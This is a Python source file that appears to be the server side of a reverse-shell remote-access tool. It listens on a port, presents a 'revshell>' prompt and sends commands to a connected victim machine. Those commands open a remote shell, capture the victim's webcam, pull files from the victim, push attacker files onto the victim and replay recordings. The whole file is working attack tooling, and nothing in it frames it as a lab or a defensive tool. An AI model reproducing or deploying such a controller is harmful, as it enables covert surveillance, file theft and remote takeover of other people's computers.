from server import Server
from prompt import InteractivePrompt
from webcam import Webcam
from shell import Shell
from transfer import FileTransfer
from outputs import Output
from recorder import Player
import signal
import sys
import os
import re
import readline

def parse_command(command, server):
	server.send(command)

	command = re.split(' |\r|\t', command)
	cmd = command[0]
	args = command[1:]
	return cmd, args

def main_loop(server):
	while True:
		# signal.signal(signal.SIGINT, sigIntHandler)
		prompt = InteractivePrompt()
		cmd = prompt.input("revshell> ")
		if not cmd:
			server.send('')
			return
		cmd, args = parse_command(cmd, server)
		if cmd == "shell":
			shell = Shell(server)
			shell.listener()
		# Rework webcam to be more comprehensible
		elif cmd == "webcam":
			webcam = Webcam(server)
			webcam.receive()
		elif cmd == "download":
			if len(args) != 2:
				Output.error('Usage: download <file_of_victim> <path_of_attacker>')
				continue
			# Usage: download <file_of_victim> <path_of_attacker>
			transfer = FileTransfer(server)
			transfer.receive(args[1])
		elif cmd == "upload":
			if len(args) != 2:
				Output.error('Usage: upload <file_of_attacker> <path_of_victim>')
				continue
			# Usage: upload <file_of_attacker> <path_of_victim>
			transfer = FileTransfer(server)
			if transfer.send(args[0]) == 1:
				Output.error(f"{args[0]}: File not found")
			else:
				Output.success(f"Successfully uploaded {args[0]}")
		elif cmd == "record":
			player = Player(server)
			player.play()
		elif cmd == "exit":
			return
		else:
			print(server.recv())

def sigIntHandler(signum, frame):
	print("\nrevshell> ", end="")

def main():
	try:
		port = int(sys.argv[1])
	except ValueError:
		print("The given port is not a number.\nUsage: python3 revshell-server.py <port>")
		exit(1)
	server = Server('0.0.0.0', port)
	server.accept()
	main_loop(server)
	

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("Usage: python3 revshell-server.py <port>")
		exit(1)
	main()